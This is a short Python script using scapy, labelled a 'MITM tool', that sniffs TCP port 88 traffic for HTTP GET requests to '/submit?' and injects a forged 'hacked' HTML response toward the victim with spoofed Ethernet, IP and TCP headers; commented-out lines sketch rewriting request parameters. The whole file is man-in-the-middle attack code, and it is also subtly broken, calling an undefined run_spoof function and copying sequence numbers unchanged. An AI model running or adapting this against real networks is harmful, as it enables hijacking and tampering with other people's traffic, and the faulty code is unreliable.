from scapy.all import *
import argparse

def forward_packet(pkt, macVictim, macTarget, macAttacker, iface):

    if pkt.haslayer(Raw) and "GET /submit?" in pkt[Raw].load:
        ip = pkt[IP]
        tcp = pkt[TCP]

        html = "<html><body><h1>hacked</h1></body></html>"
        response = "HTTP/1.1 200 OK\r\nContent-Length: %d\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n%s" % (len(html), html)

        #if ip.dport == 88 and b"POST" in raw:
        #    raw = raw.replace(b"query=hello", b"query=hacked")

            #for word, replacement in {b"query=hello": b"query=hacked"}.items():
            #    raw = raw.replace(word, replacement)

        ether = Ether(src=macAttacker, dst=macVictim)
        ip_layer = IP(src=ip.src, dst=ip.dst)
        tcp_layer = TCP(
            sport=tcp.sport,
            dport=tcp.dport,
            seq=tcp.seq,
            ack=tcp.ack,
            flags=tcp.flags
        )
        new_pkt = ether / ip_layer / tcp_layer / Raw(load=response)
        sendp(new_pkt, iface=iface, verbose=False)

def start_mitm(macVictim, macTarget, macAttacker, iface):
    print("[+] TCP forwarding between {} and {}".format(macVictim, macTarget))
    try:
        sniff(
            iface=iface,
            filter="tcp port 88",
            prn=lambda pkt: forward_packet(pkt, macVictim, macTarget, macAttacker, iface),
            store=0
        )
        print("worked")
    except KeyboardInterrupt:
        print("\n[!] MITM attack terminated.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MITM tool")
    parser.add_argument("macVictim")
    parser.add_argument("macTarget")
    parser.add_argument("macAttacker")
    parser.add_argument("iface")
    args = parser.parse_args()

    run_spoof(
        macVictim=args.macVictim,
        macTarget=args.macTarget,
        macAttacker=args.macAttacker,
        iface=args.iface
    )
